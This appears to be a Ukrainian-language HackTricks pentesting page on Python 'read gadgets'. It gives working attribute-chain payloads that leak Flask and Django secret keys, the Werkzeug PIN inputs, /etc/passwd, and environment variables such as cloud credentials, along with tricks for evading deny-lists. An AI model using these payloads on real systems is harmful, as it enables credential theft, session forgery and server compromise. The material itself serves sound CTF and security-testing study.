# Внутрішні read gadgets Python

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація

Різні вразливості, такі як [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) або [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), можуть дозволити вам **читати внутрішні дані Python, але не дозволять виконувати code**. Тому pentester повинен максимально використати ці дозволи на читання, щоб **отримати чутливі привілеї та підвищити рівень вразливості**.

### Flask - Читання secret key

На головній сторінці Flask-застосунку, імовірно, буде **глобальний об’єкт `app`**, у якому **налаштовано цей secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
У цьому випадку отримати доступ до цього об’єкта можна просто використавши будь-який gadget для **доступу до глобальних об’єктів** зі сторінки [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Якщо **вразливість знаходиться в іншому python-файлі**, потрібен gadget для обходу файлів, щоб дістатися до основного файлу, **отримати доступ до глобального об’єкта `app.secret_key`** і мати змогу [**підвищити привілеї**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign), знаючи цей ключ.

Payload на кшталт цього [з цього writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Використайте цей payload, щоб **прочитати `app.secret_key`**. Якщо оригінальний баг також надає примітив запису (наприклад, class pollution), цей самий шлях можна використати, щоб замінити його та підписувати більш привілейовані Flask cookies.

### Werkzeug - machine_id і node uuid

[**Використовуючи ці payload із цього writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) ви зможете отримати доступ до **machine_id** і **uuid** node — це **приватні біти**, потрібні для [**генерації Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) і доступу до python console у `/console`, якщо **debug mode увімкнено**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Зверніть увагу, що можна отримати **локальний шлях сервера до `app.py`**, згенерувавши деяку **помилку** на вебсторінці, яка **надасть вам цей шлях**.

Якщо вразливість знаходиться в іншому python-файлі, скористайтеся попереднім Flask trick, щоб отримати доступ до об’єктів з головного python-файлу.

### Django - SECRET_KEY та settings module

Об’єкт налаштувань Django кешується в `sys.modules` після запуску застосунку. Маючи лише примітиви читання, можна отримати leak **`SECRET_KEY`**, резервних ключів, облікових даних бази даних або солей підписування:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Якщо вразливий gadget знаходиться в іншому module, спочатку обійдіть globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` настільки ж цінні, як і поточний `SECRET_KEY`: вони й надалі перевіряють старі підписані значення під час ротації.<sup>[[1]](#references)</sup> Також витік `SESSION_ENGINE` і `SESSION_SERIALIZER` допомагає швидко визначити, чи вплив обмежується підробкою cookie, чи є щось потужніше. Докладніше про вплив на web дивіться на [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Гаджети завантажувача модулів - читання вихідного коду та файлів

Завантажені Python-модулі зазвичай зберігають `__loader__`. Завантажувачі, що працюють із файлами, часто надають `get_source()` і `get_data()`, які є ідеальними **примітивами лише для читання**, коли ви вже можете отримати доступ до об’єкта модуля, але не до `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Це дуже корисно для dump **config modules, blueprints, helper files або hidden routes** і відновлення API keys, DSNs, flag paths або додаткових gadget entry points.

Якщо у вас є лише subclass enumeration, шукайте loader за name замість жорсткого кодування індексу:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Глобальні змінні фрейму generator / coroutine

Якщо ви можете створити або отримати доступ до об’єкта generator/coroutine, його фрейм може розкрити глобальні змінні **без потреби в будь-якому gadget `__globals__` функції**. Це корисно проти фільтрів, які блокують лише імена dunder і забувають про атрибути фрейму, такі як `gi_frame`, `ag_frame`, `cr_frame` або `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Отримавши globals фрейму, продовжуйте точно так само, як і в інших gadgets (`sys.modules`, об’єкти налаштувань, `os.environ` тощо). У нових sandbox escapes це знову й знову виявляється, оскільки `gi_frame` та `f_globals` не є dunder-атрибутами й часто переживають наївні deny-lists.

### Змінні середовища / cloud creds через завантажені модулі

Багато jail все ще імпортують `os` або `sys` десь усередині. Ви можете використати будь-яку доступну функцію `__init__.__globals__`, щоб виконати pivot до вже імпортованого модуля `os` і dump-нути **змінні середовища**, що містять API-токени, cloud keys або flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Якщо індекс підкласу відфільтровано, використовуйте loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Змінні середовища часто є єдиними секретами, необхідними для переходу від read до повної компрометації (cloud IAM keys, database URLs, signing keys тощо).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) допускав **class pollution** через спеціально сформовані запити компонентів. Встановлення шляху властивості, такого як `__init__.__globals__`, давало атакувальнику доступ до глобальних змінних модуля компонента та будь-яких імпортованих модулів (наприклад, `settings`, `os`, `sys`). Звідти можна виконати leak `SECRET_KEY`, `DATABASES` або облікових даних сервісів без виконання коду. Ланцюжок експлуатації базується виключно на read-операціях і використовує ті самі dunder-gadget patterns, що й вище.<sup>[[5]](#references)</sup>

### Колекції гаджетів для chaining

Нещодавні CTF і дослідження pyjail демонструють надійні read chains, побудовані лише на доступі до атрибутів та переліку subclass. Підтримувані спільнотою списки, такі як [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), містять сотні мінімальних гаджетів, які можна комбінувати для переходу від об’єктів до `__globals__`, `sys.modules` і зрештою до чутливих даних.<sup>[[2]](#references)</sup> Надавайте перевагу пошуку **на основі атрибутів/імен** замість необроблених індексів subclass, оскільки позиція `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` тощо змінюється між версіями Python і за наявності додаткових імпортованих бібліотек.

## References

- [1] [Документація Django щодо криптографічного підписування](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki гаджетів Python sandbox](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Вразливість Django-Unicorn Class Pollution, що призводить до RCE, XSS, DoS та обходу автентифікації (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
